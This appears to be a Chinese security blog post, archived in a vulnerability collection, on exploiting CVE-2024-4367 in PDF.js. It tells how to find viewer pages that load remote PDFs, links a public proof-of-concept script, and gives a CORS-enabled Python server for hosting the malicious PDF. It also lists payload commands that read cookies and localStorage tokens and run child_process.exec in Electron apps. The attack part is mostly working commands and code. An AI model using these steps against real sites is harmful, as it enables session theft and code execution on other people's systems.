---
cve: "CVE-2024-4367"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  PDF.JS任意JS代码执行漏洞踩坑实践  
原创 ss
                    ss  shadowsec   2026-02-25 07:28  
  
    
    
PDF.js作为Mozilla开发的开源PDF阅读器库，被广泛应用于Firefox浏览器和Web应用  
中。之  
前爆出的CVE-2024-4367漏洞允许攻击者通过构造恶意PDF文件执行任意JavaS  
cript代码，影响范围包括Firefox浏览器及依赖PDF.js的Web/Electron应用。  
  
漏洞探测  
  
   
   http://xxx.com/xxx/xxxx/html/web/viewer.html?file= 形如这类格式的，功能点为预览PDF内容可以确定为PDF.JS组件  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv5lfqdZJcNJgNHGjKGMvQRibl6zVtC8Duha5ka1lsGNMW7ibJSJTPYqljzB9acIJMcwhnjsibn6quhS4j4ZlGYVqmhCrta2RibFx8Q/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
   发现这里File参数支持http协议获取PDF内容  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv68KxtyhicPOk3KjF5eXsjI0aIvhF9MtlHnpxl494WrhmmEhGSCdEV3ttrVXpycrrGKVMqHZnSGSiaBCJr56EhlrMXqTtGfDvDY0/640?wx_fmt=jpeg&from=appmsg "")  
  
  
    那么可以尝试远程加载恶意pdf的方式来利用该漏洞(如果这里不存在远程加载，仍然可以通过寻找上传口上传pdf文件来实现漏洞利用，这里不再赘述)  
  
漏洞利用  
  
利用poc：  
```
https://github.com/LOURC0D3/CVE-2024-4367-PoC/blob/main/CVE-2024-4367.py
```  
  
利用服务器起一个服务：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6icmiba7CjyEicG4SeneAxqCND6hEFe3SOxF6RXKBF21M9IHwHneblU9DM6lvyf4E3mVeQh1RfupZqTjZVtpbElSmCtdj5wxV7OU/640?wx_fmt=jpeg&from=appmsg "")  
  
  
然后利用组件访问恶意服务器  
```
http://xxx.com/web/viewer.html?file=http://xxx.com/poc.pdf
```  
  
  
      
有时会发现显示载入pdf时发生错误。这时候或许并不是不能加载，而是python起服务默认不会开启cors可跨域，导致浏览器直接阻止了pdf.js获取pdf文件。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6kY12y3I1uzQhYVmyUvibWqoVbaicLoFEgr7nW2EicGbfxdE7MuMdvQ00pJ5Zlar9AaPZty6biaib7bNn8blr6jEO7IgxqPPSge76c/640?wx_fmt=jpeg&from=appmsg "")  
  
那么这里则需要构造python脚本开启cors可任意跨域  
  
<table><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border: 0px;transition: background-color 0.2s ease-in-out;"><td style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;display: table-cell;left: 0px;z-index: 1;background-color: rgb(246, 248, 250);"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 0px 0.75rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: initial;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;text-align: right;border-right: 1px solid rgb(153, 153, 153);"><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">1</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">2</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">3</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">4</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">5</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">6</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">7</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">8</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">9</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">10</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">11</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">12</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">13</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">14</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">15</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">16</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">17</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">18</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">19</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">20</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">21</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">22</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">23</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">24</span></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">25</span></span><span leaf=""><br/></span></pre></td><td style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: border-color 0.2s ease-in-out;"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 1.45rem 1rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: 0px 3px 3px 0px;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;"><code style="white-space:pre-wrap;box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;color: rgb(36, 41, 46);overflow-wrap: normal;word-break: normal;background: 0px 0px rgb(246, 248, 250);padding: 0px;margin: 0px;border-radius: 3px;tab-size: 4;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;border: 0px;display: block;overflow: auto visible;line-height: inherit;"><span style="box-sizing: border-box;color: rgb(106, 115, 125);"><span leaf="">import</span></span><span leaf=""> http.server</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">import</span></span><span leaf=""> socketserver</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">from</span></span><span leaf=""> functools </span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">import</span></span><span leaf=""> partial</span><span leaf=""><br/></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">class</span></span><span style="box-sizing: border-box;color: rgb(111, 66, 193);"><span leaf="">CORSRequestHandler</span></span><span leaf="">(http.server.SimpleHTTPRequestHandler):</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">def</span></span><span style="box-sizing: border-box;color: rgb(111, 66, 193);"><span leaf="">end_headers</span></span><span leaf="">(</span><span style="box-sizing: border-box;"><span leaf="">self</span></span><span leaf="">):</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">self</span></span><span leaf="">.send_header(</span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;Access-Control-Allow-Origin&#39;</span></span><span leaf="">, </span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;*&#39;</span></span><span leaf="">)</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">self</span></span><span leaf="">.send_header(</span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;Access-Control-Allow-Methods&#39;</span></span><span leaf="">, </span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;GET, HEAD, OPTIONS&#39;</span></span><span leaf="">)</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">self</span></span><span leaf="">.send_header(</span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;Access-Control-Allow-Headers&#39;</span></span><span leaf="">, </span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;Content-Type&#39;</span></span><span leaf="">)</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(227, 98, 9);"><span leaf="">super</span></span><span leaf="">().end_headers() </span><span leaf=""><br/></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">def</span></span><span style="box-sizing: border-box;color: rgb(111, 66, 193);"><span leaf="">do_OPTIONS</span></span><span leaf="">(</span><span style="box-sizing: border-box;"><span leaf="">self</span></span><span leaf="">):</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">self</span></span><span leaf="">.send_response(</span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">200</span></span><span leaf="">)</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">self</span></span><span leaf="">.end_headers() </span><span leaf=""><br/></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">class</span></span><span style="box-sizing: border-box;color: rgb(111, 66, 193);"><span leaf="">ReuseTCPServer</span></span><span leaf="">(socketserver.TCPServer):</span><span leaf=""><br/></span><span leaf="">  allow_reuse_address = </span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">True</span></span><span leaf=""><br/></span><span leaf=""><br/></span><span leaf="">PORT = </span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">8080</span></span><span leaf=""><br/></span><span leaf="">DIRECTORY = </span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#34;.&#34;</span></span><span leaf=""><br/></span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">with</span></span><span leaf=""> ReuseTCPServer((</span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#34;&#34;</span></span><span leaf="">, PORT), partial(CORSRequestHandler, directory=DIRECTORY)) </span><span style="box-sizing: border-box;color: rgb(215, 58, 73);"><span leaf="">as</span></span><span leaf=""> httpd:</span><span leaf=""><br/></span><span style="box-sizing: border-box;color: rgb(227, 98, 9);"><span leaf="">print</span></span><span leaf="">(</span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">f&#34;Serving at http://0.0.0.0:</span><span style="box-sizing: border-box;color: rgb(36, 41, 46);"><span leaf="">{PORT}</span></span><span leaf=""> with CORS enabled&#34;</span></span><span leaf="">)</span><span leaf=""><br/></span><span leaf="">  httpd.serve_forever()</span><span leaf=""><br/></span></code></pre></td></tr></tbody></table>  
此时在起python服务  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6dlBgvV7qxQib5vzerQWZfnicOByLj19gocC1kmniaZmSdRicfvHBSvj5mCibv16Yn2t0ZziaC4T69zUU1Bdgxt5ynLdQA5Z5xeRbE0/640?wx_fmt=jpeg&from=appmsg "")  
  
  
访问就可以正常执行了  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GjcPTs2YKv6I5mgLMfMsuVOiabYLfjojuI3kvyQUVYjwDrMXsFg1jhibaiajTEKcYyCiaOEH7VvnGukKLXbJftrkUwUae2oQOiaRx7KRqJvTypZ4/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
   (如  
果谷歌浏览器限制不允许pdf中js执行，也可以更换浏览器尝试，比如火狐进行尝  
试)  
  
获取  
cook  
ie  
  
<table><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border: 0px;transition: background-color 0.2s ease-in-out;"><td style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;display: table-cell;left: 0px;z-index: 1;background-color: rgb(246, 248, 250);"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 0px 0.75rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: initial;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;text-align: right;border-right: 1px solid rgb(153, 153, 153);"><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">1</span></span><span leaf=""><br/></span></pre></td><td data-colwidth="549" style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: border-color 0.2s ease-in-out;"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 1.45rem 1rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: 0px 3px 3px 0px;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;"><code style="white-space:pre-wrap;box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;color: rgb(36, 41, 46);overflow-wrap: normal;word-break: normal;background: 0px 0px rgb(246, 248, 250);padding: 0px;margin: 0px;border-radius: 3px;tab-size: 4;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;border: 0px;display: block;overflow: auto visible;line-height: inherit;"><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">Python</span></span><span leaf=""> CVE-</span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">2024</span></span><span leaf="">-</span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">4367</span></span><span leaf="">.py alert(document.cookie)</span><span leaf=""><br/></span></code></pre></td></tr></tbody></table>  
获取To  
ke  
n  
  
    
  如果不是cookie，而是认证类型如jwt等则用,生成,jwt认证凭证存储在localStorage中  
  
<table><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border: 0px;transition: background-color 0.2s ease-in-out;"><td style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;display: table-cell;left: 0px;z-index: 1;background-color: rgb(246, 248, 250);"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 0px 0.75rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: initial;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;text-align: right;border-right: 1px solid rgb(153, 153, 153);"><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">1</span></span><span leaf=""><br/></span></pre></td><td data-colwidth="546" style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: border-color 0.2s ease-in-out;"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 1.45rem 1rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: 0px 3px 3px 0px;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;"><code style="white-space:pre-wrap;box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;color: rgb(36, 41, 46);overflow-wrap: normal;word-break: normal;background: 0px 0px rgb(246, 248, 250);padding: 0px;margin: 0px;border-radius: 3px;tab-size: 4;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;border: 0px;display: block;overflow: auto visible;line-height: inherit;"><span leaf="">python CVE-</span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">2024</span></span><span leaf="">-</span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">4367</span></span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">.py</span></span><span style="box-sizing: border-box;color: rgb(227, 98, 9);"><span leaf="">alert</span></span><span leaf="">(localStorage</span><span style="box-sizing: border-box;color: rgb(0, 92, 197);"><span leaf="">.getItem</span></span><span leaf="">(</span><span style="box-sizing: border-box;color: rgb(3, 47, 98);"><span leaf="">&#39;token&#39;</span></span><span leaf="">)) </span><span leaf=""><br/></span></code></pre></td></tr></tbody></table>  
代码执行（需要条件）  
  
<table><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border: 0px;transition: background-color 0.2s ease-in-out;"><td style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;display: table-cell;left: 0px;z-index: 1;background-color: rgb(246, 248, 250);"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 0px 0.75rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: initial;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;text-align: right;border-right: 1px solid rgb(153, 153, 153);"><span style="box-sizing: border-box;color: rgb(153, 153, 153);"><span leaf="">1</span></span><span leaf=""><br/></span></pre></td><td data-colwidth="551" style="box-sizing: border-box;padding: 0px;border: 0px rgb(234, 236, 239);transition: border-color 0.2s ease-in-out;"><pre style="box-sizing: border-box;font-family: SFMono-Regular, Consolas, &#34;Liberation Mono&#34;, Menlo, monospace;font-size: 13.6px;margin-top: 0px;margin-bottom: 0px;overflow: auto;display: block;color: rgb(33, 37, 41);overflow-wrap: normal;padding: 1.45rem 1rem;line-height: 1.45;background-color: rgb(246, 248, 250);border-radius: 0px 3px 3px 0px;word-break: normal;transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;"><span leaf="">python CVE-2024-4367.py&#34;require(&#39;child_process&#39;).exec(&#39;calc&#39;);&#34;</span></pre></td></tr></tbody></table>  
参考文章  
  
https://www.4awl.net/13333.html  
  
[从 XSS 到 RCE：Electron 应用中的真实攻击链](https://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247493436&idx=1&sn=06457e0fc73b9a16493921008063c84d&scene=21#wechat_redirect)  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
